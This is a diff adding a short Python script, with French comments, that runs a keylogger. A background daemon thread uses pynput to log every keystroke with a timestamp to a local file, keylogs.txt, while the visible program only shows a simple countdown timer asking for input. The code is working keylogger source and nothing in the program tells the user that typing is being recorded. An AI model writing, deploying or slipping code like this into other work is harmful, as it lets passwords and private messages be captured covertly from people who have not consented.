@@ -1,0 +1,46 @@
+import logging
+from pynput.keyboard import Key, Listener
+import threading
+import time
+
+fin = False
+
+def on_press(Key):
+    """La fonction définie ici prend un argument indiquant la touche enfoncée par
+      l'utilisateur et l'enregistre dans le fichier après l'avoir converti en chaîne."""
+    logging.info(str(Key))
+
+def tracing():
+    if not fin:
+        logging.basicConfig(filename=("keylogs.txt"),filemode='w' ,
+                            format='%(asctime)s: %(levelname)s: %(message)s',level=logging.DEBUG)
+
+        Listener(on_press=on_press).start() #une instance d’un écouteur qui enregistrerait les frappes clavier et transmettrait la fonction que nous avons créée comme argument
+
+def minuteur(dead):
+    global fin
+
+    i = 0
+    while i < dead :
+        print(i)
+        time.sleep(1)
+        i+=1
+        a = input("press 'a' pour redemarer le minuteur")
+        if a == 'a':
+            i=0
+        elif a =='b':
+            fin = True
+            break
+    
+
+
+    
+    
+
+
+threading.Thread(target=tracing,daemon=True).start()
+minuteur(10)
+
+
+
+fin = True
